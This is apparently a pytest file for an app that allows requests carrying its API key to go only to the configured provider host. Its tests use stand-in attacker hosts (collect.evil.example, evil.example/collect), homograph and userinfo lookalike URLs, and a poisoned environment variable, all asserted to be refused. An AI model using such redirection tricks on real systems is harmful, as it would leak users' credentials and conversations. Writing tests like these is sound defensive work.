"""One host, enforced in the app instead of remembered by every caller.

The promise held because every outbound call happened to build the same URL
from the same constant. That is a habit. One f-string with a host in it -
added by somebody here, or by a dependency that borrows this app's shared
client - and the conversation goes elsewhere with the Authorization header
attached, and nothing anywhere would have objected.

The suite's egress guard covers the TESTS. This covers the shipped
application, which is the half that matters to a user.

Distinct from the test guard in one important way: this one runs in
production, so a false refusal breaks a working app. Both directions are
tested here for that reason.
"""
from __future__ import annotations

from pathlib import Path

import httpx
import pytest

import config
import network_client


class TestWhatIsAllowed:
    def test_the_configured_provider_is_on_the_list(self) -> None:
        assert httpx.URL(config.OPENROUTER_BASE_URL).host \
            in network_client.allowed_hosts()

    def test_loopback_is_not_on_the_list(self) -> None:
        # This assertion is the reverse of the one it replaces. The old test
        # recorded two reasons for admitting loopback and both were measured
        # false: the proxy hop never reaches this hook (httpcore substitutes
        # the proxy origin a layer lower and leaves the original url as the
        # request-target), and the launcher probe has its own opener at
        # run_app.py:45. What the entries did buy was a permitted destination
        # for a request carrying the API key, reachable by any program that can
        # open a listening socket on this machine.
        allowed = network_client.allowed_hosts()
        assert httpx.URL(config._DEFAULT_OPENROUTER_BASE_URL).host in allowed
        assert "127.0.0.1" not in allowed
        assert "localhost" not in allowed
        assert "::1" not in allowed

    def test_loopback_comes_back_behind_the_same_switch_as_a_foreign_host(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        # tests/mock_provider.py exists so end-to-end smoke runs need no
        # network at all, and it lives on loopback. It is still reachable, but
        # the operator now has to say so out loud - the same sentence that
        # admits a staging provider, because it is the same decision: this run
        # may talk somewhere other than the shipped provider.
        monkeypatch.setattr(config, "OPENROUTER_BASE_URL",
                            "http://127.0.0.1:9797/api/v1")
        monkeypatch.setattr(config, "BASE_URL_OVERRIDE_ALLOWED", True)
        allowed = network_client.allowed_hosts()
        assert "127.0.0.1" in allowed
        assert "localhost" in allowed
        assert "::1" in allowed

    def test_the_switch_admits_all_three_spellings_or_none(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        # 127.0.0.1, localhost and ::1 are three names for one decision, and
        # the gate compares strings. Admitting two of the three would leave a
        # mock provider that works when addressed one way and is refused when
        # addressed another, which reads as a bug in the mock.
        monkeypatch.setattr(config, "BASE_URL_OVERRIDE_ALLOWED", False)
        closed = network_client.allowed_hosts()
        monkeypatch.setattr(config, "BASE_URL_OVERRIDE_ALLOWED", True)
        opened = network_client.allowed_hosts()
        assert not (closed & network_client._PLAINTEXT_OK)     # ground
        assert network_client._PLAINTEXT_OK <= opened

    def test_a_poisoned_base_url_does_not_admit_itself(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """The defect this whole class exists for, and it was REPORTED TWICE
        and lost twice before the list stopped deriving itself.

        `allowed_hosts()` used to be computed FROM `OPENROUTER_BASE_URL`, so
        the gate agreed with whatever the request already said. One
        environment variable - any program running as the user, no elevation,
        persistent - redirected the destination and granted itself permission
        in the same stroke, and `Authorization: Bearer` went with it.

        The test that used to sit here asserted the list WAS derived, which
        pinned the defect in place. Worse, it asserted it by pointing at
        loopback, which is on the list unconditionally - so after the fix it
        went on passing while proving nothing at all."""
        # Driven through the ENVIRONMENT and a module reload, not by setting
        # the attribute. The attack is an environment variable read at import,
        # so a test that patches the already-imported attribute does not
        # reproduce it: measured, the literal pre-fix code passes such a test
        # because it read a name bound at import while the test rewrote
        # `config.`. test_release_hardening.py:429 uses the same reload shape.
        import importlib

        monkeypatch.setenv("OPENROUTER_BASE_URL",
                           "https://collect.evil.example/api/v1")
        monkeypatch.delenv("ELYSIUM_ALLOW_BASE_URL_OVERRIDE", raising=False)
        importlib.reload(config)
        importlib.reload(network_client)
        try:
            # GROUND: the poisoning really took - the app IS about to talk to
            # that host, which is what makes the refusal below meaningful.
            assert config.OPENROUTER_BASE_URL.startswith(
                "https://collect.evil.example")

            allowed = network_client.allowed_hosts()
            assert "collect.evil.example" not in allowed
            # And the real provider is still reachable, so this is not an
            # empty set passing an absence check.
            assert "openrouter.ai" in allowed
        finally:
            monkeypatch.undo()
            importlib.reload(config)
            importlib.reload(network_client)

    @pytest.mark.parametrize("value,opens", [
        ("1", True),
        ("true", False),      # only exactly "1" - a typo must not open it
        ("True", False),
        ("", False),
        (" 1", False),
    ])
    def test_only_the_exact_flag_value_opens_the_door(
        self, monkeypatch: pytest.MonkeyPatch, value: str, opens: bool
    ) -> None:
        """The flag is read from the environment at import, and nothing else
        tested that reading. Without this, `BASE_URL_OVERRIDE_ALLOWED` could
        become permanently True and the suite would not notice."""
        import importlib

        monkeypatch.setenv("ELYSIUM_ALLOW_BASE_URL_OVERRIDE", value)
        monkeypatch.setenv("OPENROUTER_BASE_URL", "https://staging.example/api/v1")
        importlib.reload(config)
        importlib.reload(network_client)
        try:
            assert config.BASE_URL_OVERRIDE_ALLOWED is opens
            assert ("staging.example" in network_client.allowed_hosts()) is opens
        finally:
            monkeypatch.undo()
            importlib.reload(config)
            importlib.reload(network_client)

    def test_an_explicit_opt_in_admits_a_real_staging_provider(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """A non-loopback test server is sometimes needed, so the door is not
        nailed shut - it needs a second, differently named switch that says
        out loud what it does. Two variables are not a wall against
        somebody who can already write one; what they remove is the SILENT
        path."""
        monkeypatch.setattr(config, "OPENROUTER_BASE_URL",
                            "https://staging.example/api/v1")
        monkeypatch.setattr(config, "BASE_URL_OVERRIDE_ALLOWED", True)

        allowed = network_client.allowed_hosts()

        assert "staging.example" in allowed
        assert "openrouter.ai" in allowed


class TestWhatIsRefused:
    @pytest.mark.anyio
    @pytest.mark.parametrize("url", [
        "https://evil.example/collect",
        "https://api.openai.com/v1/chat/completions",
        "https://openrouter.ai.evil.example/api/v1",   # suffix, not the host
        "https://raw.githubusercontent.com/x/y",
    ])
    async def test_a_request_to_another_host_never_leaves(
        self, anyio_backend, url: str
    ) -> None:
        request = httpx.Request("POST", url)
        with pytest.raises(network_client.EgressRefused) as caught:
            await network_client._one_host_only(request)
        assert httpx.URL(url).host in str(caught.value)

    @pytest.mark.anyio
    async def test_the_right_host_over_plain_http_is_still_refused(
        self, anyio_backend
    ) -> None:
        """The second hole, and the one only the SCHEME catches.

        `http://openrouter.ai/api/v1` names the correct host, so the host
        check waved it through and `Authorization: Bearer` left over port 80
        in the clear for anyone on the path. Nothing in this class covered
        it: every URL above is already https, so the check could be deleted
        and the suite would not notice - measured, 29/29 green with the
        scheme branch removed."""
        request = httpx.Request(
            "POST", "http://openrouter.ai/api/v1/chat/completions")
        with pytest.raises(network_client.EgressRefused) as caught:
            await network_client._one_host_only(request)
        assert "http" in str(caught.value)

    @pytest.mark.anyio
    async def test_loopback_is_refused_by_the_host_gate_before_the_scheme_gate(
        self, anyio_backend, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """Which gate refuses it, not merely that it is refused.

        With loopback out of the default set the host check fires first, so
        the message names the host rather than the scheme. That ordering is
        worth pinning: a refusal that blamed plain http would send somebody
        looking for a certificate, and the real answer is that the address is
        not on the list at all.
        """
        monkeypatch.setattr(config, "BASE_URL_OVERRIDE_ALLOWED", False)
        request = httpx.Request("POST", "http://127.0.0.1:9797/api/v1/models")
        with pytest.raises(network_client.EgressRefused) as caught:
            await network_client._one_host_only(request)
        assert "exactly one host" in str(caught.value)

    @pytest.mark.anyio
    async def test_loopback_over_plain_http_is_allowed_once_it_is_admitted(
        self, anyio_backend, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """The discriminating control, now behind the switch. A blanket https
        rule would break the local mock provider, which is plain http and
        never leaves the machine, so the exemption still has to be measured
        rather than assumed."""
        monkeypatch.setattr(config, "BASE_URL_OVERRIDE_ALLOWED", True)
        request = httpx.Request("POST", "http://127.0.0.1:9797/api/v1/models")
        await network_client._one_host_only(request)   # must not raise

    @pytest.mark.anyio
    async def test_the_provider_itself_passes(self, anyio_backend) -> None:
        # The control. A hook that refuses everything is not a chokepoint, it
        # is an outage, and it would pass every test above.
        request = httpx.Request(
            "POST", f"{config.OPENROUTER_BASE_URL}/chat/completions")
        await network_client._one_host_only(request)

    @pytest.mark.anyio
    async def test_it_refuses_before_anything_is_sent(
        self, anyio_backend, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        # An event hook on "request" runs before the transport, so the refusal
        # costs a connection that was never opened - not a request sent and
        # then regretted.
        monkeypatch.setattr(network_client, "get_secret", lambda name: None)
        client = network_client._build_client()
        try:
            with pytest.raises(network_client.EgressRefused):
                await client.get("https://evil.example/collect")
        finally:
            await client.aclose()


class TestTheHookIsActuallyInstalled:
    """A chokepoint nothing routes through is a comment."""

    def test_the_direct_client_carries_it(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setattr(network_client, "get_secret", lambda name: None)
        client = network_client._build_client()
        try:
            assert network_client._one_host_only \
                in client.event_hooks["request"]
        finally:
            client.close() if hasattr(client, "close") else None

    def test_the_proxied_client_carries_it_too(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        # Two constructor calls in one function is exactly where a hook gets
        # added to one and forgotten on the other - and the proxied branch is
        # the one a privacy-conscious user is on.
        monkeypatch.setattr(network_client, "get_secret",
                            lambda name: "http://127.0.0.1:9050")
        client = network_client._build_client()
        try:
            assert network_client._one_host_only \
                in client.event_hooks["request"]
        finally:
            client.close() if hasattr(client, "close") else None

    @pytest.mark.anyio
    async def test_a_proxied_client_still_checks_the_destination(
        self, anyio_backend, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        # With a proxy configured the socket goes to the proxy, so a check at
        # the connection layer would see only 127.0.0.1 and wave everything
        # through. The hook reads the TARGET url, which is what the proxy is
        # being asked to fetch.
        monkeypatch.setattr(network_client, "get_secret",
                            lambda name: "http://127.0.0.1:9050")
        client = network_client._build_client()
        try:
            with pytest.raises(network_client.EgressRefused):
                await client.get("https://evil.example/collect")
        finally:
            await client.aclose()


class TestTheHostComparisonFailsInTheSafeDirection:
    """Anything that is not exactly the provider host is refused.

    A comparison this strict has edge cases in BOTH directions, and only one
    of them is acceptable. A form of the provider's own name that does not
    match costs a broken request; a form of somebody else's that does match
    costs the conversation. These pin which way each one falls.
    """

    @pytest.mark.anyio
    @pytest.mark.parametrize("host", [
        "openrouter.ai.",              # trailing dot: a distinct FQDN form
        "0penrouter.ai",               # a digit for a letter
        "xn--openroutr-o1a.ai",        # punycode homograph
        "openrouter.ai:443@evil.example",
    ])
    async def test_a_lookalike_is_refused(self, anyio_backend, host: str
                                          ) -> None:
        request = httpx.Request("GET", f"https://{host}/api/v1/models")
        with pytest.raises(network_client.EgressRefused):
            await network_client._one_host_only(request)

    @pytest.mark.anyio
    async def test_an_uppercase_provider_host_still_passes(
        self, anyio_backend
    ) -> None:
        # httpx normalises the host, and the hook lowercases anyway. If this
        # ever failed, a perfectly ordinary URL would stop working.
        request = httpx.Request("GET", "https://OPENROUTER.AI/api/v1/models")
        await network_client._one_host_only(request)

    @pytest.mark.anyio
    async def test_an_ipv6_loopback_literal_passes_once_admitted(
        self, anyio_backend, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        # The mock provider can be addressed this way, and httpx hands the
        # hook "::1" with the brackets stripped. That stripping is the point
        # of the test: if it ever changed, the string compare against the
        # admitted set would silently stop matching.
        monkeypatch.setattr(config, "BASE_URL_OVERRIDE_ALLOWED", True)
        request = httpx.Request("GET", "http://[::1]:9797/api/v1/models")
        await network_client._one_host_only(request)

    @pytest.mark.anyio
    async def test_an_unusual_loopback_spelling_is_refused_not_guessed(
        self, anyio_backend
    ) -> None:
        # 0:0:0:0:0:0:0:1 IS ::1, and this refuses it. That is the safe
        # direction - a refusal breaks a request nobody makes, where guessing
        # at equivalences is how an allowlist grows a hole - and it is written
        # down here so the behaviour is chosen rather than discovered.
        request = httpx.Request("GET", "http://[0:0:0:0:0:0:0:2]/x")
        with pytest.raises(network_client.EgressRefused):
            await network_client._one_host_only(request)


class TestNothingElseBuildsAClient:
    """The chokepoint only chokes what routes through it.

    `_one_host_only` is installed by `network_client._build_client`. Any module
    that constructs its own `httpx.Client`/`AsyncClient` gets no hook, no
    `trust_env=False` and no vault-configured proxy - it simply leaves by
    another door, and every test above would still pass.

    Several router modules promise this in their header prose ("This module
    does NOT import httpx"). The only thing that checked it was one line in
    `verify/verify_phase5b.py`, which looks at a single file AND is never
    collected by pytest (nothing under backend/verify matches test_*.py, and
    the repo has no pytest config to widen that), so it has been running
    exactly never. Added 2026-08-10.
    """

    #: The one module allowed to build a client, plus the test tree, which
    #: fakes clients on purpose.
    ALLOWED = {"network_client.py"}

    #: Every way out of this process that skips the hook, and one synthetic
    #: line for each. The first form was all this checked for a while, and the
    #: other three were measured as holes on 2026-08-17: the promise the router
    #: docstrings make is about IMPORTING httpx, and this only looked at how a
    #: client is CONSTRUCTED.
    #:
    #: The `clean` line beside each offender is what stops a pattern from being
    #: written so wide that it forbids using httpx's names at all. Both halves
    #: are asserted, so a pattern that matches everything fails just as loudly
    #: as one that matches nothing.
    BYPASSES = (
        (
            "builds a client of its own, so it gets no hook, no "
            "trust_env=False and no vault proxy",
            r"httpx\.(?:Async)?Client\s*\(",
            "c = httpx.AsyncClient(timeout=5)",
            "except httpx.TimeoutException:",
        ),
        (
            "imports httpx by name, which is what the router docstrings "
            "actually promise not to do, and the dotted patterns cannot see",
            r"(?m)^\s*from\s+httpx\s+import\b",
            "from httpx import AsyncClient",
            "import httpx  # for the exception types",
        ),
        (
            "calls httpx at module level, which builds a throwaway client "
            "inside the library where nothing can reach it",
            r"httpx\.(?:request|get|post|put|patch|delete|head|options|"
            r"stream)\s*\(",
            "r = httpx.post(url, json=body)",
            "timeout = httpx.Timeout(5.0)",
        ),
        (
            "builds a transport of its own, which is the layer the hook and "
            "the proxy settings are attached to",
            r"httpx\.(?:Async)?HTTPTransport\s*\(",
            "t = httpx.AsyncHTTPTransport(retries=2)",
            "limits = httpx.Limits(max_connections=4)",
        ),
    )

    def _sources(self) -> list[Path]:
        backend = Path(__file__).resolve().parents[1]
        skip = {"tests", "verify", ".venv", "__pycache__", "build", "dist"}
        return [
            p for p in backend.rglob("*.py")
            if not (skip & set(p.relative_to(backend).parts))
        ]

    @pytest.mark.parametrize("what,pattern,offender,clean", BYPASSES)
    def test_nothing_but_the_chokepoint_leaves_by_this_door(
        self, what: str, pattern: str, offender: str, clean: str
    ) -> None:
        import re

        sources = self._sources()
        # Floor: an empty walk would report perfect compliance.
        assert len(sources) >= 40, f"only {len(sources)} modules walked"

        door = re.compile(pattern)
        offenders = [
            str(p.name) for p in sources
            if p.name not in self.ALLOWED
            and door.search(p.read_text(encoding="utf-8", errors="strict"))
        ]
        assert not offenders, f"{sorted(offenders)}: each one {what}"

    @pytest.mark.parametrize("what,pattern,offender,clean", BYPASSES)
    def test_each_door_can_actually_fail(
        self, what: str, pattern: str, offender: str, clean: str
    ) -> None:
        """Guard the guard: every pattern must match the thing it forbids.

        WHAT THIS CANNOT DO, said plainly because the sentence is the point:
        it reads text. `getattr(httpx, "Cli" + "ent")()` defeats it, and so
        does any client built by a dependency rather than by this repository.
        That is the ceiling of static reading, not a gap to be patched here.
        The layer that actually holds is `_one_host_only` plus the socket
        guard in `tests/egress_guard.py`, and both are tested above and next
        door. This check exists to keep a NEW module from quietly walking out,
        which is the mistake somebody actually makes.
        """
        import re

        door = re.compile(pattern)
        assert door.search(offender), pattern
        assert not door.search(clean), pattern


class TestARefusalSaysWhyInTheLog:
    """Nothing downstream can say it, so this says it.

    EgressRefused is never caught by name anywhere in the app: six call sites
    swallow it into `except Exception` and report type(exc).__name__.
    Measured, with OPENROUTER_BASE_URL naming a foreign host and the flag
    absent: five different error codes and six different sentences reach the
    user, and two of them tell them to check a proxy that is working.
    """

    @pytest.mark.anyio
    async def test_a_poisoned_variable_is_named_as_the_cause(
        self, anyio_backend, monkeypatch: pytest.MonkeyPatch, caplog
    ) -> None:
        monkeypatch.setattr(config, "OPENROUTER_BASE_URL_OVERRIDDEN", True)
        monkeypatch.setattr(config, "BASE_URL_OVERRIDE_ALLOWED", False)
        request = httpx.Request("POST", "https://evil.example.com/api/v1/x")
        with caplog.at_level("WARNING", logger=network_client.logger.name):
            with pytest.raises(network_client.EgressRefused):
                await network_client._one_host_only(request)
        said = " ".join(r.getMessage() for r in caplog.records)
        assert "ELYSIUM_ALLOW_BASE_URL_OVERRIDE" in said
        assert "evil.example.com" in said

    @pytest.mark.anyio
    async def test_an_ordinary_refusal_does_not_blame_the_variable(
        self, anyio_backend, monkeypatch: pytest.MonkeyPatch, caplog
    ) -> None:
        # The discriminating half. A refusal that has nothing to do with the
        # override must not send somebody hunting for an environment variable
        # they never set.
        monkeypatch.setattr(config, "OPENROUTER_BASE_URL_OVERRIDDEN", False)
        monkeypatch.setattr(config, "BASE_URL_OVERRIDE_ALLOWED", False)
        request = httpx.Request("POST", "https://evil.example.com/api/v1/x")
        with caplog.at_level("WARNING", logger=network_client.logger.name):
            with pytest.raises(network_client.EgressRefused):
                await network_client._one_host_only(request)
        said = " ".join(r.getMessage() for r in caplog.records)
        assert "evil.example.com" in said          # ground: it did report
        assert "ELYSIUM_ALLOW_BASE_URL_OVERRIDE" not in said

    @pytest.mark.anyio
    async def test_the_refusal_log_carries_no_path_and_no_header(
        self, anyio_backend, monkeypatch: pytest.MonkeyPatch, caplog
    ) -> None:
        # This function sees every outbound request, so it is the one place a
        # url path or an Authorization header could reach the log.
        monkeypatch.setattr(config, "OPENROUTER_BASE_URL_OVERRIDDEN", True)
        monkeypatch.setattr(config, "BASE_URL_OVERRIDE_ALLOWED", False)
        request = httpx.Request(
            "POST", "https://evil.example.com/api/v1/chat/a-chat-title",
            headers={"Authorization": "Bearer sk-secret-value"})
        with caplog.at_level("WARNING", logger=network_client.logger.name):
            with pytest.raises(network_client.EgressRefused):
                await network_client._one_host_only(request)
        said = " ".join(r.getMessage() for r in caplog.records)
        assert "a-chat-title" not in said
        assert "sk-secret-value" not in said
        assert "Bearer" not in said
